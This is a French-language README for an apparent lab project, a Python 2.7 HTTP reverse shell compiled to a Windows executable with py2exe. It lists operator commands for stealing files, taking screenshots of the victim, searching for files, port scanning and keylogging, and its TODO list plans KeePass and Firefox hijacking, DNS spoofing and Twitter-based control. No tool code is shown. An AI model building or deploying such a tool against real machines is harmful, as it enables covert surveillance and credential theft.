# HTTP_reverse_shell

## Installer python
Python 2.7 en 32bits OBLIGATOIRE

https://www.python.org/downloads/release/python-2712/ -> Windows x86 MSI installer


## Installer pip
wget https://bootstrap.pypa.io/get-pip.py

`python get-pip.py`

## Installer la lib requests
`pip install requests`

## Isntaller la lib pyHook & pywin32
https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/pyHook-1.5.1.win32-py2.7.exe/download

https://sourceforge.net/projects/pywin32/files/pywin32/Build%20220/pywin32-220.win32-py2.7.exe/download

ou `pip install pywin32`

## Installer la lib pyperclip
`pip install pyperclip`


## Installer py2exe
Installer https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/ -> py2exe-0.6.9.win32-py2.7.exe

## Build le reverse_shell côté client
Placer les fichiers `HTTP_reverse_shell_client.py` et `setup.py` dans le même dossier puis exécuter setup.py

## Fonctionnalité
Les commandes utilisables:

	aide -> affiche cette aide

	vol [file] -> recuperer un fichier sur la cible, ex: vol fichier\a\recuperer

	capture -> prendre un screenshot de la victime

	chercher [path]*[extension] -> rechercher a l'interieur du repertoire "path" les fichiers de type "extension", ex: chercher C:\\\\*.pdf

	cd [path] -> changer de path courant, ex: cd C:\\Users\Desktop\

	scan [ip]:[ports] -> scanner les ports de l\'hote "ip". Ports specifies (1,2,3...) ou sous forme d'ecrat (1-5), ex: scan 10.10.10.10:1-500 ou scan 10.10.10.10:80, 8080, 453

	keylogger [path] -> lance un keylogger, si aucun path n'est precise il enregistre dans le fichier "logs.txt" dans le repertoire courant. Attention aux droits d\'ecriture		
			


## TODO
- DNS via le lab - DNS déjà disponible donc pas besoin de dynDNS
- Communication via twitter
- keepass hijack
- Firefox Hijacking
- DNS Spoofing - ATTENTION: nécessite droit admin, seul? pb?



